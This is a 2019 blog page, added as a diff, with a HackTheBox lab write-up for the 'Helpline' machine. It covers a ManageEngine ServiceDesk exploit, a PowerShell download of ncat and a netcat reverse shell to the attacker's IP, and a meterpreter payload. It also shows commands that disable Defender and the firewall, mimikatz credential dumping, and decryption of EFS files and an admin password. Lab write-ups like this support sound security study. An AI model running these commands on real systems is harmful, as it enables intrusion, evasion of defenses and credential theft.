@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+  <head>
+  <meta charset="utf-8" />
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>HackTheBox - WriteUp 13 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手 - Helpline - Encrypted File System on Windows" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-123948588-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+  <style>
+    body {
+      background: #ecedef url("https://alicdn.kmahyyg.xyz/asset_files/aether/bgimg.webp") repeat;
+    }
+  </style>
+</head>
+  <body class="single-body">
+    <nav class="nav-bar side-padding">
+  <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
+  <div class="hamburger-menu">
+    <button onclick="hamburgerMenuPressed.call(this)" aria-haspopup="true" aria-expanded="false" aria-controls="menu" aria-label="Menu">
+      <span></span>
+      <span></span>
+    </button>
+    <ul id="menu" class="hamburger-menu-overlay">
+      <li><a href="https://www.kmahyyg.xyz/" class="hamburger-menu-overlay-link">Home</a></li>
+      <li><a href="https://www.kmahyyg.xyz/express-page/" class="hamburger-menu-overlay-link">Express Inc</a></li>
+      <li><a href="https://www.kmahyyg.xyz/about-me-page/" class="hamburger-menu-overlay-link">About</a></li>
+      <li><a href="https://www.kmahyyg.xyz/archlinux-bug-page/" class="hamburger-menu-overlay-link">Arch Linux</a></li>
+      <li><a href="https://www.kmahyyg.xyz/donate-page/" class="hamburger-menu-overlay-link">Donate</a></li>
+      <li><a href="https://www.kmahyyg.xyz/categories/code" class="hamburger-menu-overlay-link">Code</a></li><li><a href="https://www.kmahyyg.xyz/categories/life" class="hamburger-menu-overlay-link">Life</a></li><li><a href="https://www.kmahyyg.xyz/categories/network" class="hamburger-menu-overlay-link">Network</a></li><li><a href="https://www.kmahyyg.xyz/categories/school" class="hamburger-menu-overlay-link">School</a></li><li><a href="https://www.kmahyyg.xyz/categories/tech" class="hamburger-menu-overlay-link">Tech</a></li>
+    </ul>
+  </div>
+</nav>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 13</h1>
+          <p class="post-date">Posted <time datetime="2019-07-13">Jul 13, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="helpline">Helpline</h1>
+
+<p>Difficulty: 8.<sup>2</sup>&frasl;<sub>10</sub></p>
+
+<p>Nmap:135,445(SMB),8080(Tomcat Service Desk),5985(Windows Remote Management Port),49667(MSRPC Support)</p>
+
+<h1 id="user">User</h1>
+
+<p>First, we know there&rsquo;s port 8080, the footer showed us this software version is Zoho ManageEngine ServiceDesk v9.3, we use searchsploit, and find Exploit-DBID: 46674. Access <a href="https://flameofignis.com/en/vuln/CVE-2019-10008">the blog</a> this text file mentioned, do some modification. With the default <code>guest:guest</code> credentials and modified cookies here, you&rsquo;re able to access as administrator of ServiceDesk, download the PoC, and change the host <code>host=&quot;10.10.10.132:8080&quot;</code>, that&rsquo;s all.</p>
+
+<p>After that, create Technician Account as you want and give the SDAdmin privilege, this will help you maintain the administrator privilege even you get logged out.</p>
+
+<p>Prepare a static-linked binary called <code>ncat.exe</code>, and use the following two commands to create two custom triggers when met the condition you set. Don&rsquo;t forget to set up a web server first.</p>
+
+<p>First:  <code>powershell -exec bypass -c Invoke-WebRequest http://10.10.14.6:8080/ncat.exe -OutFile nc.exe</code></p>
+
+<p>Second: <code>cmd /c nc.exe 10.10.14.6 4455 -e cmd.exe</code></p>
+
+<p>Now you&rsquo;ll get the shell as <code>nt authority/system</code>, however, since this box enabled Encrypted NTFS (EFS in abbr), you can&rsquo;t read the flag now. We can only know from the prompt at the beginning that this server is based on Windows 10 17763(Build 1809), which might also be Windows Server 2016.</p>
+
+<p>Use <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=7777 -f exe &gt; test.exe</code> to generate a meterpreter trojan for preparation.</p>
+
+<p>Run <code>powershell</code> in the shell you just got, and execute the following command to disable Windows defender and firewall:</p>
+
+<pre><code class="language-powershell">PS &gt; Set-MpPreference -DisableRealtimeMonitoring $true 
+PS &gt; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+</code></pre>
+
+<p>Don&rsquo;t try to enable RDP, group policy prevent you from logged in.</p>
+
+<p>Upload meterpreter trojan, then execute, access it via <code>exploit/multi/handler</code> with the same payload and payload param. It would be perfect if you upload the whole <code>mimikatz</code> binary to the victim now.</p>
+
+<h2 id="read-the-user-flag">Read the user flag</h2>
+
+<h3 id="rdp-vnc">RDP/VNC</h3>
+
+<p>In meterpreter shell, run <code>migrate 2878</code> to migrate the meterpreter core to a process owned by leo, then <code>msfvenom</code> generate a <code>vncinject</code> trojan, upload and run. You can directly access the user.txt flag.</p>
+
+<h3 id="hardcore-cli-only">Hardcore: CLI Only</h3>
+
+<p>Get another meterpreter shell using the same method above, in order to maintain the privilege of <code>nt authority/system</code>.</p>
+
+<p>First use <code>$Env:PSModulePath</code> in powershell to check whether to save our powershell script. Following <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">the readme in Powersploit</a> , Then run <code>Get-RegistryAutoLogon</code>, you&rsquo;ll get the password of the leo.</p>
+
+<p>OR, you can also use <code>mimikatz</code> built inside the meterpreter with <code>load kiwi</code>, issue <code>creds_all</code>, or issue <code>sekurlsa::logonpasswords</code> in pure mimikatz you&rsquo;ll get sha1 hash of leo&rsquo;s password.</p>
+
+<p>Then just follow the direction of mimikatz wiki <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">How to decrypt EFS Files - Mimikatz</a>, you&rsquo;ll get User flag.</p>
+
+<h1 id="root">Root</h1>
+
+<p>Grab you shell, <code>get-eventlog security | export-clixml C:\temp\opt1.xml</code>, download the output system security eventlog, <code>cat opt1.xml | grep -n tolu | grep -n net</code> in your local bash, you&rsquo;ll find the password of tolu. Use tolu&rsquo;s password, follow the mimikatz wiki, you can decrypt <code>admin-pass.xml</code>, and find a string called <code>SecureString</code> in powershell, you should use the following commnad to decrypt it and get the plaintext password, run it with leo&rsquo;s account using the meterpreter shell you just got.</p>
+
+<pre><code class="language-powershell">$SecuredPWD = Get-Content C:\fakepath\admin-pass.xml
+$SecureStringAsPlainText = $SecuredPWD | ConvertTo-SecureString
+$cred = new-object System.Management.Automation.PSCredential 'HELPLINE\Administrator',$SecureStringAsPlainText
+$cred.GetNetworkCredential() | fl
+</code></pre>
+
+<p>Then,since you have the plaintext credential of administrator, decrypt the root flag again using the same method, you&rsquo;ll get it.</p>
+
+<p>(END)</p>
+
+<h1 id="referrence">Referrence</h1>
+
+<ul>
+<li><a href="https://flameofignis.com/en/vuln/CVE-2019-10008">https://flameofignis.com/en/vuln/CVE-2019-10008</a></li>
+<li><a href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/">https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/</a></li>
+<li><a href="https://www.hackingarticles.in/post-exploitation-remote-windows-password/">https://www.hackingarticles.in/post-exploitation-remote-windows-password/</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files">https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></li>
+<li><a href="https://eventlogxp.com/blog/exporting-event-logs-with-windows-powershell/">https://eventlogxp.com/blog/exporting-event-logs-with-windows-powershell/</a></li>
+<li><a href="https://stackoverflow.com/questions/46547174/is-there-a-way-to-use-convertfrom-securestring-and-convertto-securestring-with-a">https://stackoverflow.com/questions/46547174/is-there-a-way-to-use-convertfrom-securestring-and-convertto-securestring-with-a</a></li>
+<li><a href="https://www.itprotoday.com/powershell/powershell-makes-security-log-access-easy">https://www.itprotoday.com/powershell/powershell-makes-security-log-access-easy</a></li>
+<li><a href="https://www.youtube.com/watch?v=ob9SgtFm6_g">https://www.youtube.com/watch?v=ob9SgtFm6_g</a>  IPPSEC-Reel-HacktheBox</li>
+</ul>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup14/" class="card blog-card" rel="bookmark" >
+    
+    <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
+      <picture>
+        
+        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
+      </picture>
+    </div>
+    
+  <article class="card-body">
+    <h2 class="card-title">HackTheBox - WriteUp 14</h2>
+    <p class="card-text">HackTheBox 练手 - Jarvis - SQLi&#43;Systemd</p>
+    <div class="card-subtext muted-text">
+      <p>Posted <time datetime="2019-07-13 713:00">Jul 13, 2019</time></p>
+      <p>#tech </p>
+    </div>
+  </article>
+</a>
+      
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
+    </nav>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+    onload="renderMathInElement(document.body);"></script>
+<script src="https://www.kmahyyg.xyz/js/core.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+  </body>
+</html>
